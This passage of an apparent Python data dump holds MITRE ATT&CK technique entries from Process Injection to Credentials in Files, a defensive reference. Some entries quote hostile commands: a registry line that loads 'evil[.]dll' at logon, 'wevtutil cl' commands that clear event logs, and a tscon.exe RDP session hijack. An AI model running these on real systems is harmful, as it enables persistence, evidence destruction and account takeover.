                          "portable executable (PE) to redirect a process to malicious code before reaching the code's "
                          'legitimate entry point. (Citation: FireEye TLS Nov 2017)\n'
                          '\n'
                          '### Mac and Linux\n'
                          '\n'
                          'Implementations for Linux and OS X/macOS systems include: (Citation: Datawire Code '
                          'Injection) (Citation: Uninformed Needle)\n'
                          '\n'
                          '* **LD_PRELOAD, LD_LIBRARY_PATH** (Linux), **DYLD_INSERT_LIBRARIES** (Mac OS X) environment '
                          'variables, or the dlfcn application programming interface (API) can be used to dynamically '
                          'load a library (shared object) in a process which can be used to intercept API calls from '
                          'the running process. (Citation: Phrack halfdead 1997)\n'
                          '* **Ptrace system calls** can be used to attach to a running process and modify it in '
                          'runtime. (Citation: Uninformed Needle)\n'
                          '* **/proc/[pid]/mem** provides access to the memory of the process and can be used to '
                          'read/write arbitrary data to it. This technique is very rare due to its complexity. '
                          '(Citation: Uninformed Needle)\n'
                          '* **VDSO hijacking** performs runtime injection on ELF binaries by manipulating code stubs '
                          'mapped in from the linux-vdso.so shared object. (Citation: VDSO hijack 2009)\n'
                          '\n'
                          'Malware commonly utilizes process injection to access system resources through which '
                          'Persistence and other environment modifications can be made. More sophisticated samples may '
                          'perform multiple process injections to segment modules and further evade detection, '
                          'utilizing named pipes or other inter-process communication (IPC) mechanisms as a '
                          'communication channel.',
           'name': 'Process Injection',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1056': {'attack_id': 'T1056',
           'categories': ['collection', 'credential-access'],
           'description': 'Adversaries can use methods of capturing user input for obtaining credentials for [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) and information Collection that '
                          'include keylogging and user input field interception.\n'
                          '\n'
                          'Keylogging is the most prevalent type of input capture, with many different ways of '
                          'intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to '
                          'target information for specific purposes, such as performing a UAC prompt or wrapping the '
                          'Windows default credential provider. (Citation: Wrightson 2012)\n'
                          '\n'
                          'Keylogging is likely to be used to acquire credentials for new access opportunities when '
                          '[Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, '
                          'and may require an adversary to remain passive on a system for a period of time before an '
                          'opportunity arises.\n'
                          '\n'
                          'Adversaries may also install code on externally facing portals, such as a VPN login page, '
                          'to capture and transmit credentials of users who attempt to log into the service. This '
                          'variation on input capture may be conducted post-compromise using legitimate administrative '
                          'access as a backup measure to maintain network access through [External Remote '
                          'Services](https://attack.mitre.org/techniques/T1133) and [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise '
                          'by exploitation of the externally facing web service. (Citation: Volexity Virtual Private '
                          'Keylogging)',
           'name': 'Input Capture',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1057': {'attack_id': 'T1057',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get information about running processes on a system. Information '
                          'obtained could be used to gain an understanding of common software running on systems '
                          'within the network. Adversaries may use the information from [Process '
                          'Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape '
                          'follow-on behaviors, including whether or not the adversary fully infects the target and/or '
                          'attempts specific actions.\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'An example command that would obtain details on processes is "tasklist" using the '
                          '[Tasklist](https://attack.mitre.org/software/S0057) utility.\n'
                          '\n'
                          '### Mac and Linux\n'
                          '\n'
                          'In Mac and Linux, this is accomplished with the <code>ps</code> command.',
           'name': 'Process Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1058': {'attack_id': 'T1058',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Windows stores local service configuration information in the Registry under '
                          '<code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a '
                          "service's Registry keys can be manipulated to modify a service's execution parameters "
                          'through tools such as the service controller, sc.exe, '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086), or '
                          '[Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled '
                          'through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n'
                          '\n'
                          'If the permissions for users and groups are not properly set and allow access to the '
                          'Registry keys for a service, then adversaries can change the service binPath/ImagePath to '
                          'point to a different executable under their control. When the service starts or is '
                          'restarted, then the adversary-controlled program will execute, allowing the adversary to '
                          'gain persistence and/or privilege escalation to the account context the service is set to '
                          'execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n'
                          '\n'
                          'Adversaries may also alter Registry keys associated with service failure parameters (such '
                          'as <code>FailureCommand</code>) that may be executed in an elevated context anytime the '
                          'service fails or is intentionally corrupted.(Citation: TrustedSignal Service '
                          'Failure)(Citation: Twitter Service Recovery Nov 2017)',
           'name': 'Service Registry Permissions Weakness',
           'platforms': ['Windows']},
 'T1059': {'attack_id': 'T1059',
           'categories': ['execution'],
           'description': 'Command-line interfaces provide a way of interacting with computer systems and is a common '
                          'feature across many types of operating system platforms. (Citation: Wikipedia Command-Line '
                          'Interface) One example command-line interface on Windows systems is '
                          '[cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of '
                          'tasks including execution of other software. Command-line interfaces can be interacted with '
                          'locally or remotely via a remote desktop application, reverse shell session, etc. Commands '
                          'that are executed run with the current permission level of the command-line interface '
                          'process unless the command includes process invocation that changes permissions context for '
                          'that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).\n'
                          '\n'
                          'Adversaries may use command-line interfaces to interact with systems and execute other '
                          'software during the course of an operation.',
           'name': 'Command-Line Interface',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1060': {'attack_id': 'T1060',
           'categories': ['persistence'],
           'description': 'Adding an entry to the "run keys" in the Registry or startup folder will cause the program '
                          'referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs '
                          "will be executed under the context of the user and will have the account's associated "
                          'permissions level.\n'
                          '\n'
                          'The following run keys are created by default on Windows systems:\n'
                          '* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n'
                          '* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n'
                          '* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n'
                          '* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n'
                          '\n'
                          'The '
                          '<code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is '
                          'also available but is not created by default on Windows Vista and newer. Registry run key '
                          'entries can reference programs directly or list them as a dependency. (Citation: Microsoft '
                          'RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a "Depend" key '
                          'with RunOnceEx: <code>reg add '
                          'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d '
                          '"C:\\temp\\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n'
                          '\n'
                          'The following Registry keys can be used to set startup folder items for persistence:\n'
                          '* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User '
                          'Shell Folders</code>\n'
                          '* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell '
                          'Folders</code>\n'
                          '* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell '
                          'Folders</code>\n'
                          '* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User '
                          'Shell Folders</code>\n'
                          '\n'
                          'The following Registry keys can control automatic startup of services during boot:\n'
                          '* '
                          '<code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n'
                          '* '
                          '<code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n'
                          '* '
                          '<code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n'
                          '* '
                          '<code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n'
                          '\n'
                          'Using policy settings to specify startup programs creates corresponding values in either of '
                          'two Registry keys:\n'
                          '* '
                          '<code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n'
                          '* '
                          '<code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n'
                          '\n'
                          'The Winlogon key controls actions that occur when a user logs on to a computer running '
                          'Windows 7. Most of these actions are under the control of the operating system, but you can '
                          'also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\Winlogon\\Userinit</code> and '
                          '<code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n'
                          '\n'
                          'Programs listed in the load value of the registry key '
                          '<code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> '
                          'run when any user logs on.\n'
                          '\n'
                          'By default, the multistring BootExecute value of the registry key '
                          '<code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set '
                          'to autocheck autochk *. This value causes Windows, at startup, to check the file-system '
                          'integrity of the hard disks if the system has been shut down abnormally. Adversaries can '
                          'add other programs or processes to this registry value which will automatically launch at '
                          'boot.\n'
                          '\n'
                          '\n'
                          'Adversaries can use these configuration locations to execute malware, such as remote access '
                          'tools, to maintain persistence through system reboots. Adversaries may also use '
                          '[Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look '
                          'as if they are associated with legitimate programs.',
           'name': 'Registry Run Keys / Startup Folder',
           'platforms': ['Windows']},
 'T1061': {'attack_id': 'T1061',
           'categories': ['execution'],
           'description': 'The Graphical User Interfaces (GUI) is a common way to interact with an operating system. '
                          "Adversaries may use a system's GUI during an operation, commonly through a remote "
                          'interactive session such as [Remote Desktop '
                          'Protocol](https://attack.mitre.org/techniques/T1076), instead of through a [Command-Line '
                          'Interface](https://attack.mitre.org/techniques/T1059), to search for information and '
                          'execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia '
                          'Run Command), or other potentially difficult to monitor interactions.',
           'name': 'Graphical User Interface',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1062': {'attack_id': 'T1062',
           'categories': ['persistence'],
           'description': 'A type-1 hypervisor is a software layer that sits between the guest operating systems and '
                          "system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running "
                          'environment to an operating system. An example of a common hypervisor is Xen. (Citation: '
                          'Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could '
                          'be designed with [Rootkit](https://attack.mitre.org/techniques/T1014) functionality to hide '
                          'its existence from the guest operating system. (Citation: Myers 2007) A malicious '
                          'hypervisor of this nature could be used to persist on systems through interruption.',
           'name': 'Hypervisor',
           'platforms': ['Windows']},
 'T1063': {'attack_id': 'T1063',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get a listing of security software, configurations, defensive '
                          'tools, and sensors that are installed on the system. This may include things such as local '
                          'firewall rules and anti-virus. Adversaries may use the information from [Security Software '
                          'Discovery](https://attack.mitre.org/techniques/T1063) during automated discovery to shape '
                          'follow-on behaviors, including whether or not the adversary fully infects the target and/or '
                          'attempts specific actions.\n'
                          '\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Example commands that can be used to obtain security software information are '
                          '[netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with '
                          '[Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with '
                          '[cmd](https://attack.mitre.org/software/S0106), and '
                          '[Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery '
                          'behavior may be more specific to the type of software or security system the adversary is '
                          'looking for.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          "It's becoming more common to see macOS malware perform checks for LittleSnitch and "
                          'KnockKnock software.',
           'name': 'Security Software Discovery',
           'platforms': ['macOS', 'Windows']},
 'T1064': {'attack_id': 'T1064',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Adversaries may use scripts to aid in operations and perform multiple actions that would '
                          'otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the '
                          'time required to gain access to critical resources. Some scripting languages may be used to '
                          'bypass process monitoring mechanisms by directly interacting with the operating system at '
                          'an API level instead of calling other programs. Common scripting languages for Windows '
                          'include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also '
                          'be in the form of command-line batch scripts.\n'
                          '\n'
                          'Scripts can be embedded inside Office documents as macros that can be set to execute when '
                          'files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and '
                          'other types of spearphishing are opened. Malicious embedded macros are an alternative means '
                          'of execution than software exploitation through [Exploitation for Client '
                          'Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on '
                          'macros being allowed or that the user will accept to activate them.\n'
                          '\n'
                          'Many popular offensive frameworks exist which use forms of scripting for security testers '
                          'and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), '
                          'and PowerSploit (Citation: Powersploit) are three examples that are popular among '
                          'penetration testers for exploit and post-compromise operations and include many features '
                          'for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch '
                          '2014)',
           'name': 'Scripting',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1065': {'attack_id': 'T1065',
           'categories': ['command-and-control'],
           'description': 'Adversaries may conduct C2 communications over a non-standard port to bypass proxies and '
                          'firewalls that have been improperly configured.',
           'name': 'Uncommonly Used Port',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1066': {'attack_id': 'T1066',
           'categories': ['defense-evasion'],
           'description': 'If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be '
                          'able to determine why the malicious tool was detected (the indicator), modify the tool by '
                          'removing the indicator, and use the updated version that is no longer detected by the '
                          "target's defensive systems or subsequent targets that may use similar systems.\n"
                          '\n'
                          'A good example of this is when malware is detected with a file signature and quarantined by '
                          'anti-virus software. An adversary who can determine that the malware was quarantined '
                          'because of its file signature may use [Software '
                          'Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has '
                          'a different signature, and then re-use the malware.',
           'name': 'Indicator Removal from Tools',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1067': {'attack_id': 'T1067',
           'categories': ['persistence'],
           'description': 'A bootkit is a malware variant that modifies the boot sectors of a hard drive, including '
                          'the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n'
                          '\n'
                          'Adversaries may use bootkits to persist on systems at a layer below the operating system, '
                          'which may make it difficult to perform full remediation unless an organization suspects one '
                          'was used and can act accordingly.\n'
                          '\n'
                          '### Master Boot Record\n'
                          'The MBR is the section of disk that is first loaded after completing hardware '
                          'initialization by the BIOS. It is the location of the boot loader. An adversary who has raw '
                          'access to the boot drive may overwrite this area, diverting execution during startup from '
                          'the normal boot loader to adversary code. (Citation: Lau 2011)\n'
                          '\n'
                          '### Volume Boot Record\n'
                          'The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an '
                          'adversary who has raw access to the boot drive may overwrite the VBR to divert execution '
                          'during startup to adversary code.',
           'name': 'Bootkit',
           'platforms': ['Linux', 'Windows']},
 'T1068': {'attack_id': 'T1068',
           'categories': ['privilege-escalation'],
           'description': 'Exploitation of a software vulnerability occurs when an adversary takes advantage of a '
                          'programming error in a program, service, or within the operating system software or kernel '
                          'itself to execute adversary-controlled code. Security constructs such as permission levels '
                          'will often hinder access to information and use of certain techniques, so adversaries will '
                          'likely need to perform Privilege Escalation to include use of software exploitation to '
                          'circumvent those restrictions.\n'
                          '\n'
                          'When initially gaining access to a system, an adversary may be operating within a lower '
                          'privileged process which will prevent them from accessing certain resources on the system. '
                          'Vulnerabilities may exist, usually in operating system components and software commonly '
                          'running at higher permissions, that can be exploited to gain higher levels of access on the '
                          'system. This could enable someone to move from unprivileged or user level permissions to '
                          'SYSTEM or root permissions depending on the component that is vulnerable. This may be a '
                          'necessary step for an adversary compromising a endpoint system that has been properly '
                          'configured and limits other privilege escalation methods.',
           'name': 'Exploitation for Privilege Escalation',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1069': {'attack_id': 'T1069',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to find local system or domain-level groups and permissions '
                          'settings. \n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Examples of commands that can list groups are <code>net group /domain</code> and <code>net '
                          'localgroup</code> using the [Net](https://attack.mitre.org/software/S0039) utility.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'On Mac, this same thing can be accomplished with the <code>dscacheutil -q group</code> for '
                          'the domain, or <code>dscl . -list /Groups</code> for local groups.\n'
                          '\n'
                          '### Linux\n'
                          '\n'
                          'On Linux, local groups can be enumerated with the <code>groups</code> command and domain '
                          'groups via the <code>ldapsearch</code> command.\n'
                          '\n'
                          '### Office 365 and Azure AD\n'
                          '\n'
                          'With authenticated access there are several tools that can be used to find permissions '
                          'groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and '
                          'permissions groups for Exchange and Office 365 accounts.(Citation: Microsoft '
                          'msrole)(Citation: GitHub Raindance)\n'
                          '\n'
                          'Azure CLI (AZ CLI) also provides an interface to obtain permissions groups with '
                          'authenticated access to a domain. The command <code>az ad user get-member-groups</code> '
                          'will list groups associated to a user account.(Citation: Microsoft AZ CLI)(Citation: Black '
                          'Hills Red Teaming MS AD Azure, 2018)',
           'name': 'Permission Groups Discovery',
           'platforms': ['Linux', 'macOS', 'Windows', 'Office 365', 'Azure AD']},
 'T1070': {'attack_id': 'T1070',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may delete or alter generated artifacts on a host system, including logs and '
                          'potentially captured files such as quarantined malware. Locations and format of logs will '
                          'vary, but typical organic system logs are captured as Windows events or Linux/macOS files '
                          'such as [Bash History](https://attack.mitre.org/techniques/T1139) and /var/log/* .\n'
                          '\n'
                          'Actions that interfere with eventing and other notifications that can be used to detect '
                          'intrusion activity may compromise the integrity of security solutions, causing events to go '
                          'unreported. They may also make forensic analysis and incident response more difficult due '
                          'to lack of sufficient data to determine what occurred.\n'
                          '\n'
                          '### Clear Windows Event Logs\n'
                          '\n'
                          "Windows event logs are a record of a computer's alerts and notifications. Microsoft defines "
                          'an event as "any significant occurrence in the system or in a program that requires users '
                          'to be notified or an entry added to a log." There are three system-defined sources of '
                          'Events: System, Application, and Security.\n'
                          ' \n'
                          'Adversaries performing actions related to account management, account logon and directory '
                          'service access, etc. may choose to clear the events in order to hide their activities.\n'
                          '\n'
                          'The event logs can be cleared with the following utility commands:\n'
                          '\n'
                          '* <code>wevtutil cl system</code>\n'
                          '* <code>wevtutil cl application</code>\n'
                          '* <code>wevtutil cl security</code>\n'
                          '\n'
                          'Logs may also be cleared through other mechanisms, such as '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086).',
           'name': 'Indicator Removal on Host',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1071': {'attack_id': 'T1071',
           'categories': ['command-and-control'],
           'description': 'Adversaries may communicate using a common, standardized application layer protocol such as '
                          'HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands '
                          'to the remote system, and often the results of those commands, will be embedded within the '
                          'protocol traffic between the client and server.\n'
                          '\n'
                          'For connections that occur internally within an enclave (such as those between a proxy or '
                          'pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.',
           'name': 'Standard Application Layer Protocol',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1072': {'attack_id': 'T1072',
           'categories': ['execution', 'lateral-movement'],
           'description': 'Third-party applications and software deployment systems may be in use in the network '
                          'environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). If an '
                          'adversary gains access to these systems, then they may be able to execute code.\n'
                          '\n'
                          'Adversaries may gain access to and use third-party systems installed within an enterprise '
                          'network, such as administration, monitoring, and deployment systems as well as third-party '
                          'gateways and jump servers used for managing other systems. Access to a third-party '
                          'network-wide or enterprise-wide software system may enable an adversary to have remote code '
                          'execution on all systems that are connected to such a system. The access may be used to '
                          'laterally move to other systems, gather information, or cause a specific effect, such as '
                          'wiping the hard drives on all endpoints.\n'
                          '\n'
                          'The permissions required for this action vary by system configuration; local credentials '
                          'may be sufficient with direct access to the third-party system, or specific domain '
                          'credentials may be required. However, the system may require an administrative account to '
                          "log in or to perform it's intended purpose.",
           'name': 'Third-party Software',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1073': {'attack_id': 'T1073',
           'categories': ['defense-evasion'],
           'description': 'Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely '
                          'specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. '
                          'Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) '
                          'manifests (Citation: MSDN Manifests) are not explicit enough about characteristics of the '
                          'DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable '
                          'to side-loading to load a malicious DLL. (Citation: Stewart 2014)\n'
                          '\n'
                          'Adversaries likely use this technique as a means of masking actions they perform under a '
                          'legitimate, trusted system or software process.',
           'name': 'DLL Side-Loading',
           'platforms': ['Windows']},
 'T1074': {'attack_id': 'T1074',
           'categories': ['collection'],
           'description': 'Collected data is staged in a central location or directory prior to Exfiltration. Data may '
                          'be kept in separate files or combined into one file through techniques such as [Data '
                          'Compressed](https://attack.mitre.org/techniques/T1002) or [Data '
                          'Encrypted](https://attack.mitre.org/techniques/T1022).\n'
                          '\n'
                          'Interactive command shells may be used, and common functionality within '
                          '[cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a '
                          'staging location.',
           'name': 'Data Staged',
           'platforms': ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure']},
 'T1075': {'attack_id': 'T1075',
           'categories': ['lateral-movement'],
           'description': 'Pass the hash (PtH) is a method of authenticating as a user without having access to the '
                          "user's cleartext password. This method bypasses standard authentication steps that require "
                          'a cleartext password, moving directly into the portion of the authentication that uses the '
                          'password hash. In this technique, valid password hashes for the account being used are '
                          'captured using a Credential Access technique. Captured hashes are used with PtH to '
                          'authenticate as that user. Once authenticated, PtH may be used to perform actions on local '
                          'or remote systems. \n'
                          '\n'
                          'Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 '
                          'administrator hashes. (Citation: NSA Spotting)',
           'name': 'Pass the Hash',
           'platforms': ['Windows']},
 'T1076': {'attack_id': 'T1076',
           'categories': ['lateral-movement'],
           'description': 'Remote desktop is a common feature in operating systems. It allows a user to log into an '
                          'interactive session with a system desktop graphical user interface on a remote system. '
                          'Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote '
                          'Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other '
                          'implementations and third-party tools that provide graphical access [Remote '
                          'Services](https://attack.mitre.org/techniques/T1021) similar to RDS.\n'
                          '\n'
                          'Adversaries may connect to a remote system over RDP/RDS to expand access if the service is '
                          'enabled and allows access to accounts with known credentials. Adversaries will likely use '
                          'Credential Access techniques to acquire credentials to use with RDP. Adversaries may also '
                          'use RDP in conjunction with the [Accessibility '
                          'Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: '
                          'Alperovitch Malware)\n'
                          '\n'
                          'Adversaries may also perform RDP session hijacking which involves stealing a legitimate '
                          "user's remote session. Typically, a user is notified when someone else is trying to steal "
                          'their session and prompted with a question. With System permissions and using Terminal '
                          'Services Console, <code>c:\\windows\\system32\\tscon.exe [session number to be '
                          'stolen]</code>, an adversary can hijack a session without the need for credentials or '
                          'prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or '
                          'locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can '
                          'also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and '
                          'Privilege Escalation by stealing a Domain Admin or higher privileged account session. All '
                          'of this can be done by using native Windows commands, but it has also been added as a '
                          'feature in RedSnarf. (Citation: Kali Redsnarf)',
           'name': 'Remote Desktop Protocol',
           'platforms': ['Windows']},
 'T1077': {'attack_id': 'T1077',
           'categories': ['lateral-movement'],
           'description': 'Windows systems have hidden network shares that are accessible only to administrators and '
                          'provide the ability for remote file copy and other administrative functions. Example '
                          'network shares include <code>C$</code>, <code>ADMIN$</code>, and <code>IPC$</code>. \n'
                          '\n'
                          'Adversaries may use this technique in conjunction with administrator-level [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system '
                          'over server message block (SMB) (Citation: Wikipedia SMB) to interact with systems using '
                          'remote procedure calls (RPCs), (Citation: TechNet RPC) transfer files, and run transferred '
                          'binaries through remote Execution. Example execution techniques that rely on authenticated '
                          'sessions over SMB/RPC are [Scheduled Task](https://attack.mitre.org/techniques/T1053), '
                          '[Service Execution](https://attack.mitre.org/techniques/T1035), and [Windows Management '
                          'Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM '
                          'hashes to access administrator shares on systems with [Pass the '
                          'Hash](https://attack.mitre.org/techniques/T1075) and certain configuration and patch '
                          'levels. (Citation: Microsoft Admin Shares)\n'
                          '\n'
                          'The [Net](https://attack.mitre.org/software/S0039) utility can be used to connect to '
                          'Windows admin shares on remote systems using <code>net use</code> commands with valid '
                          'credentials. (Citation: Technet Net Use)',
           'name': 'Windows Admin Shares',
           'platforms': ['Windows']},
 'T1078': {'attack_id': 'T1078',
           'categories': ['defense-evasion', 'persistence', 'privilege-escalation', 'initial-access'],
           'description': 'Adversaries may steal the credentials of a specific user or service account using '
                          'Credential Access techniques or capture credentials earlier in their reconnaissance process '
                          'through social engineering for means of gaining Initial Access. \n'
                          '\n'
                          'Accounts that an adversary may use can fall into three categories: default, local, and '
                          'domain accounts. Default accounts are those that are built-into an OS such as Guest or '
                          'Administrator account on Windows systems or default factory/provider set accounts on other '
                          'types of systems, software, or devices. Local accounts are those configured by an '
                          'organization for use by users, remote support, services, or for administration on a single '
                          'system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts are those '
                          'managed by Active Directory Domain Services where access and permissions are configured '
                          'across systems and services that are part of that domain. Domain accounts can cover users, '
                          'administrators, and services.\n'
                          '\n'
                          'Compromised credentials may be used to bypass access controls placed on various resources '
                          'on systems within the network and may even be used for persistent access to remote systems '
                          'and externally available services, such as VPNs, Outlook Web Access and remote desktop. '
                          'Compromised credentials may also grant an adversary increased privilege to specific systems '
                          'or access to restricted areas of the network. Adversaries may choose not to use malware or '
                          'tools in conjunction with the legitimate access those credentials provide to make it harder '
                          'to detect their presence.\n'
                          '\n'
                          'Default accounts are also not limited to Guest and Administrator on client machines, they '
                          'also include accounts that are preset for equipment such as network devices and computer '
                          'applications whether they are internal, open source, or COTS. Appliances that come preset '
                          'with a username and password combination pose a serious threat to organizations that do not '
                          'change it post installation, as they are easy targets for an adversary. Similarly, '
                          'adversaries may also utilize publicly disclosed private keys, or stolen private keys, to '
                          'legitimately connect to remote environments via [Remote '
                          'Services](https://attack.mitre.org/techniques/T1021) (Citation: Metasploit SSH Module)\n'
                          '\n'
                          'The overlap of account access, credentials, and permissions across a network of systems is '
                          'of concern because the adversary may be able to pivot across accounts and systems to reach '
                          'a high level of access (i.e., domain or enterprise administrator) to bypass access controls '
                          'set within the enterprise. (Citation: TechNet Credential Theft)',
           'name': 'Valid Accounts',
           'platforms': ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure', 'SaaS', 'Office 365']},
 'T1079': {'attack_id': 'T1079',
           'categories': ['command-and-control'],
           'description': 'An adversary performs C2 communications using multiple layers of encryption, typically (but '
                          'not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme '
                          'such as HTTPS or SMTPS.',
           'name': 'Multilayer Encryption',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1080': {'attack_id': 'T1080',
           'categories': ['lateral-movement'],
           'description': 'Content stored on network drives or in other shared locations may be tainted by adding '
                          'malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens '
                          "the shared tainted content, the malicious portion can be executed to run the adversary's "
                          'code on a remote system. Adversaries may use tainted shared content to move laterally.\n'
                          '\n'
                          'A directory share pivot is a variation on this technique that uses several other techniques '
                          'to propagate malware when users access a shared network directory. It uses [Shortcut '
                          'Modification](https://attack.mitre.org/techniques/T1023) of directory .LNK files that use '
                          '[Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real '
                          'directories, which are hidden through [Hidden Files and '
                          'Directories](https://attack.mitre.org/techniques/T1158). The malicious .LNK-based '
                          'directories have an embedded command that executes the hidden malware file in the directory '
                          "and then opens the real intended directory so that the user's expected action still occurs. "
                          'When used with frequently used network directories, the technique may result in frequent '
                          'reinfections and broad access to systems and potentially to new and higher privileged '
                          'accounts. (Citation: Retwin Directory Share Pivot)\n'
                          '\n'
                          'Adversaries may also compromise shared network directories through binary infections by '
                          'appending or prepending its code to the healthy binary on the shared network directory. The '
                          'malware may modify the original entry point (OEP) of the healthy binary to ensure that it '
                          'is executed before the legitimate code. The infection could continue to spread via the '
                          'newly infected file when it is executed by a remote system. These infections may target '
                          'both binary and non-binary formats that end with extensions including, but not limited to, '
                          '.EXE, .DLL, .SCR, .BAT, and/or .VBS.',
           'name': 'Taint Shared Content',
           'platforms': ['Windows']},
 'T1081': {'attack_id': 'T1081',
           'categories': ['credential-access'],
           'description': 'Adversaries may search local file systems and remote file shares for files containing '
                          'passwords. These can be files created by users to store their own credentials, shared '
                          'credential stores for a group of individuals, configuration files containing passwords for '
